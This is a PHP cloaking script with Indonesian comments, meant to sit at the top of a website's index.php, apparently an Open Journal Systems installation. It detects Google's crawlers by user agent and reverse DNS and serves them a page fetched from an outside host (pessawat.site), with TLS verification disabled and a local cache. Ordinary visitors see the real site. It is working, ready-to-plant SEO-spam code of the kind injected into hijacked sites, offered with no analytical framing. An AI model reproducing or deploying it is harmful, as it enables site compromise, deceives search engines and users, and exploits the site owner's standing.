<?php
/**
 * CLOAKING SCRIPT - VERSION ULTIMATE
 * Letak: Paling atas index.php SEBELUM apapun
 */

// ==================== KONFIGURASI ====================
$landing_url = 'https://pessawat.site/iyaisoo/index.html';
$cache_file = __DIR__ . '/cache_landing.html';
$cache_time = 3600; // 1 jam

// ==================== FUNGSI DETEKSI BOT ====================
function is_google_bot() {
    // 1. CEK USER AGENT
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $google_bots = [
        'Googlebot',
        'Google-Site-Verification', 
        'Google-InspectionTool',
        'Googlebot-Mobile',
        'Googlebot-News',
        'Googlebot-Image',
        'Googlebot-Video',
        'AdsBot-Google',
        'Mediapartners-Google'
    ];
    
    foreach($google_bots as $bot) {
        if(stripos($ua, $bot) !== false) {
            return true;
        }
    }
    
    // 2. CEK IP VIA REVERSE DNS
    if(isset($_SERVER['REMOTE_ADDR'])) {
        $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
        if(strpos($host, 'googlebot.com') !== false || 
           strpos($host, 'google.com') !== false ||
           strpos($host, 'crawl.google') !== false) {
            return true;
        }
    }
    
    // 3. CEK HEADER REQUEST
    if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        if(strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'en-US') !== false && 
           !isset($_SERVER['HTTP_REFERER'])) {
            // Kemungkinan bot
        }
    }
    
    return false;
}

// ==================== EKSEKUSI CLOAKING ====================
if(is_google_bot()) {
    // ATTEMPT 1: PAKE CACHE
    if(file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
        $content = file_get_contents($cache_file);
        if($content) {
            header('Content-Type: text/html; charset=UTF-8');
            echo $content;
            exit;
        }
    }
    
    // ATTEMPT 2: PAKE CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $landing_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Googlebot');
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.google.com/');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'Cache-Control: no-cache'
    ]);
    
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // ATTEMPT 3: PAKE FILE_GET_CONTENTS
    if(!$content || $http_code != 200) {
        $opts = [
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n"
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        $context = stream_context_create($opts);
        $content = @file_get_contents($landing_url, false, $context);
    }
    
    // KALO SUKSES, TAMPILIN DAN CACHE
    if($content && strlen($content) > 100) {
        // Simpan cache
        @file_put_contents($cache_file, $content);
        
        header('Content-Type: text/html; charset=UTF-8');
        header('Cache-Control: no-cache, must-revalidate');
        echo $content;
        exit;
    }
    
    // ATTEMPT 4: FALLBACK KALO LANDING GA BISA
    // Tampilkan konten sederhana
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Welcome</title>
        <meta charset="UTF-8">
        <meta name="robots" content="index, follow">
    </head>
    <body>
        <h1>Welcome to Our Website</h1>
        <p>We provide quality content for our visitors.</p>
        
        <!-- KONTEN UNTUK GOOGLE -->
        <article>
            <h2>Featured Article</h2>
            <p>This is the content that Google bot will see.</p>
            <p>Make sure to update this content regularly.</p>
        </article>
        
        <footer>
            <p>&copy; 2024 All Rights Reserved</p>
        </footer>
    </body>
    </html>
    <?php
    exit;
}

require_once './lib/pkp/includes/functions.php';
